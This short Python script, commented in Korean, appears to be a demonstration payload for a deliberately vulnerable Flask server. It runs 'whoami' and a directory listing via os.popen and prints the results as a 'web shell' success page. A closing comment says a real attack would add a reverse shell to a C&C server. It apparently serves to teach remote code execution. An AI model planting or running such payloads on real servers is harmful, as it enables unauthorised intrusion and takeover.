import os
import sys

# RCE payload executed by the Vulnerable Flask Server (Subprocess)
def run_shell():
    print("<h1><font color='lime'>Python RCE Web Shell (Successful Execution!)</font></h1>")
    print("<p>서버 내부에서 <b>Python 코드</b>가 실행되어 원격 서버 권한을 장악했습니다!</p>")
    
    # 윈도우/리눅스 환경 명령어 예시 (사용자 정보 확인)
    cmd1 = 'whoami'
    output1 = os.popen(cmd1).read()
    print(f"<h3>[명령어 실행 결과: {cmd1}]</h3>")
    print(f"<pre style='background:black; color:lime; padding:10px;'>{output1}</pre>")
    
    # 디렉토리 내용 확인 (윈도우용 dir)
    cmd2 = 'dir' if os.name == 'nt' else 'ls -al'
    output2 = os.popen(cmd2).read()
    print(f"<h3>[서버 폴더 목록: {cmd2}]</h3>")
    print(f"<pre style='background:black; color:lime; padding:10px;'>{output2}</pre>")
    
    print("<hr><p style='color:gray'>※ 실제 공격에서는 이 스크립트 안에 리버스 쉘(Reverse Shell) 코드를 넣어 공격자의 C&C 서버와 양방향 통신을 연결합니다.</p>")

if __name__ == '__main__':
    run_shell()
